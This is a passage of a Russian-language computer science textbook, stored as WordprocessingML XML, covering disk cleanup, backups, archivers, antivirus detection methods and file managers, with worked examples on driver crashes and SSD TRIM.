        <w:t>##### б) Очистка диска (Disk Cleanup / BleachBit)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Назначение:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Удаление ненужных файлов: временные файлы, кэш браузеров, старые обновления, корзина.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Windows:** Disk Cleanup (`cleanmgr.exe`).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Linux:** BleachBit (графический), `apt autoremove` (командная строка).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**macOS:** встроенная очистка в Storage Management.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Что можно удалить:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Временные файлы (`C:\Windows\Temp`).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Кэш браузера (Chrome кэширует гигабайты данных).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Старые обновления Windows (папка `C:\Windows.old` может занимать 20+ GB).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Корзина (удалённые файлы висят в корзине, занимая место).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Диск C: забит (осталось 2 GB). Запустил Disk Cleanup. Удалил временные файлы (5 GB), старые обновления (15 GB), кэш браузера (3 GB). Освободил 23 GB. Облегчение.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>##### в) Резервное копирование (Backup)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Назначение:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Создание копии данных на случай сбоя (диск сдох, вирус зашифровал файлы, случайно удалил важный документ).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Windows:** Windows Backup, File History.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Linux:** `rsync`, Timeshift (системные снапшоты).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**macOS:** Time Machine (легендарная утилита, делает снапшоты автоматически).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Типы бэкапов:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Полный бэкап (Full Backup):** Копируются все файлы. Занимает много места, долго.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Инкрементальный бэкап (Incremental Backup):** Копируются только изменённые файлы с последнего бэкапа. Быстрее, меньше места.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Дифференциальный бэкап (Differential Backup):** Копируются файлы, изменённые с последнего полного бэкапа.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Правило 3-2-1:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**3 копии данных** (оригинал + 2 бэкапа).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**2 разных носителя** (например, диск + облако).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**1 копия офлайн** (внешний диск, отключённый от компьютера, защита от вируса-шифровальщика).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Работаешь над дипломом. Хранишь файл на ноутбуке. Ноутбук украли. Диплом потерян. Пишешь заново (слёзы).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Лучше:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Оригинал на ноутбуке.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Бэкап на внешнем диске (каждый вечер копируешь).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Бэкап в облаке (Google Drive, Dropbox, OneDrive).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Ноутбук украли → открыл Google Drive на другом компьютере → скачал диплом. Всё цело. Спасибо бэкапам.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>3. Архиваторы (связь с главой 1.12)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Архиватор</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — программа для сжатия файлов. Мы детально разбирали сжатие в главе 1.12 (RLE, Хаффман, LZW, Deflate, LZMA).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Windows:** WinRAR (платный, но "бесплатный" — все игнорируют лицензию), 7-Zip (бесплатный, лучший).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Linux:** `gzip`, `tar`, `xz`, `zip`.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**macOS:** встроенный Archive Utility (ZIP), Keka (бесплатный, поддерживает 7z, RAR).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Популярные форматы:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| Формат | Алгоритм        | Степень сжатия | Скорость  | Применение                |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|--------|-----------------|----------------|-----------|---------------------------|</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ZIP</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">    | Deflate         | Средняя        | Быстрая   | Универсальный (все ОС)    |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>RAR</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">    | Proprietary     | Высокая        | Средняя   | Популярен в Windows       |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>7z</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">     | LZMA            | Очень высокая  | Медленная | Максимальное сжатие       |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>tar.gz</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | gzip (Deflate)  | Средняя        | Быстрая   | Стандарт в Linux          |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>tar.xz</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | LZMA2           | Очень высокая  | Медленная | Архивы исходников (Linux) |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Папка с фотографиями (1000 фото, 5 GB). Заархивировал в 7z → размер 4.8 GB (сжатие 4%, потому что JPEG уже сжат). Заархивировал папку с текстовыми документами (100 MB) → размер 10 MB (сжатие 90%, текст хорошо сжимается).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>4. Антивирусы</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Антивирус</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — программа для защиты от вредоносного ПО (вирусы, трояны, черви, шифровальщики, рекламное ПО).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Windows Defender (Microsoft Defender):** Встроенный в Windows 10/11. Бесплатный, неплохой (2025 год — реально защищает).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Kaspersky:** Мощный, но платный (~$40/год). Популярен в России.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**ESET NOD32:** Лёгкий, быстрый, платный.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**ClamAV (Linux):** Бесплатный, open-source. Слабее коммерческих, но для серверов подходит.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Как работает антивирус?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Сигнатуры вирусов:**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Антивирус содержит базу данных сигнатур (fingerprints) известных вирусов.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Сканирует файлы, сравнивает с базой. Совпадение → вирус обнаружен.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Проблема: новые вирусы (zero-day) не в базе, антивирус их не видит.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Эвристический анализ:**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Антивирус анализирует поведение программы. Если она ведёт себя подозрительно (шифрует файлы, изменяет системные файлы, открывает сетевые соединения без разрешения) → блокирует.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Проблема: ложные срабатывания (false positives). Легальная программа может быть заблокирована.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Песочница (Sandbox):**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Подозрительная программа запускается в изолированной среде (виртуальная машина). Антивирус смотрит, что она делает. Если ведёт себя зловредно → удаляет.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Нужен ли антивирус?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Windows:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Да, но **Windows Defender достаточно** для большинства пользователей (2025 год). Не нужно платить за Kaspersky / Norton / McAfee.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Главное: не качать пиратский софт с сомнительных сайтов, не кликать на "скачать бесплатно 1000 GB RAM".</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Linux:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Антивирус почти не нужен. Вирусов под Linux мало (меньше 1% рынка десктопов → не интересен хакерам).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Основная угроза: серверы (веб-серверы могут быть взломаны через уязвимости в ПО).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>macOS:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Раньше считалось, что Mac защищён. Сейчас вирусы под macOS существуют (рекламное ПО, трояны).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>macOS имеет встроенную защиту (Gatekeeper, XProtect). Дополнительный антивирус желателен, но не обязателен.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Скачал файл `crack_photoshop.exe` с сомнительного сайта. Windows Defender заблокировал: "Обнаружена угроза: Trojan:Win32/Wacatac". Удалил файл. Спасибо, Defender.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>5. Файловые менеджеры</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Файловый менеджер</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — программа для управления файлами и папками (копирование, перемещение, удаление, переименование).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Windows:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Windows Explorer (File Explorer):** Встроенный файловый менеджер.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Total Commander:** Двухпанельный менеджер (удобен для работы с большим количеством файлов). Платный, но популярный.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Linux:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Nautilus (GNOME):** Файловый менеджер для GNOME (Ubuntu).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Dolphin (KDE):** Файловый менеджер для KDE (Kubuntu).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Midnight Commander (`mc`):** Консольный двухпанельный менеджер (для терминала).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>macOS:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Finder:** Встроенный файловый менеджер.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Зачем нужны альтернативные файловые менеджеры?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Встроенные менеджеры (Explorer, Finder) просты, но ограничены. Профессиональные менеджеры (Total Commander, Midnight Commander) предлагают:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Двухпанельный интерфейс (две папки рядом, удобно копировать).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Массовое переименование файлов.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Встроенный просмотр файлов (текст, изображения, видео).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Работа с архивами (как с обычными папками).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Нужно скопировать 1000 фотографий из папки A в папку B, но только те, которые весят &gt; 5 MB. В Windows Explorer — мука (выделять вручную). В Total Commander — фильтр по размеру, выделение, копирование. 2 минуты.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>3.3.5. Связь с другими главами</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Глава 2.1-2.3 (Архитектура ЭВМ, принципы фон Неймана):** Системное ПО управляет железом, о котором мы говорили в разделе 2 (процессор, память, диски).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Глава 3.1 (Операционные системы):** ОС — это ядро системного ПО. Драйверы и утилиты работают в связке с ОС.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Глава 3.2 (Уровни ПО):** Системное ПО — это нижний уровень (над железом, под сервисным и прикладным ПО).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Глава 1.12 (Способы сжатия информации):** Архиваторы (7-Zip, WinRAR) используют алгоритмы сжатия (Deflate, LZMA), о которых мы говорили в главе 1.12.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Глава 5 (Алгоритмы):** Планировщик процессов в ОС, алгоритмы эвристического анализа в антивирусах.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Глава 9 (Информационная безопасность):** Антивирусы, защита от вирусов, уязвимости в драйверах.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Примеры для понимания</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 1: BSOD из-за драйвера</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Почему кривой драйвер видеокарты вызывает Blue Screen of Death, а вылет игры — нет?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ответ:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Драйвер видеокарты</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> работает в </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>kernel mode</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (режим ядра). Имеет полный доступ к памяти и железу. Если драйвер содержит баг (например, обращается к несуществующему адресу памяти), он может перезаписать память ядра ОС. Ядро обнаруживает повреждение и падает, чтобы предотвратить дальнейший ущерб (data corruption). Результат: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>BSOD</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (Blue Screen of Death).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Игра</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> работает в </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>user mode</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (пользовательский режим). Имеет доступ только к своей памяти. Если игра крашнется (баг, segmentation fault), ОС просто завершит процесс игры. Другие процессы (и ядро) не пострадают.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вывод:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Kernel-mode код опасен. Одна ошибка → вся система падает. User-mode код безопасен. Ошибка → падает только программа.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 2: Дефрагментация HDD vs TRIM на SSD</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> У тебя два диска: HDD 1 TB и SSD 500 GB. Когда нужна дефрагментация?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ответ:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>HDD (жёсткий диск):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Дефрагментация **полезна**. Файлы фрагментированы → головка диска прыгает туда-сюда → медленно. Дефрагментация собирает фрагменты вместе → последовательное чтение → быстрее.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Рекомендуется дефрагментировать HDD раз в месяц (если диск активно используется).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>SSD (твердотельный накопитель):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Дефрагментация **вредна**. SSD не имеет движущихся частей, доступ к любой ячейке одинаково быстрый. Дефрагментация = лишние записи → износ SSD.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Вместо дефрагментации используется **TRIM** — команда, которая сообщает SSD, какие блоки данных больше не используются. SSD может стереть их заранее.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вывод:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Для HDD — дефрагментация. Для SSD — TRIM (автоматически в современных ОС).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 3: Работа антивируса (сигнатуры + эвристика)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Скачал файл `invoice.pdf.exe`. Антивирус заблокировал. Как он понял, что это вирус?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Решение:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>1. Сигнатура:</w:t>
      </w:r>
    </w:p>
    <w:p>
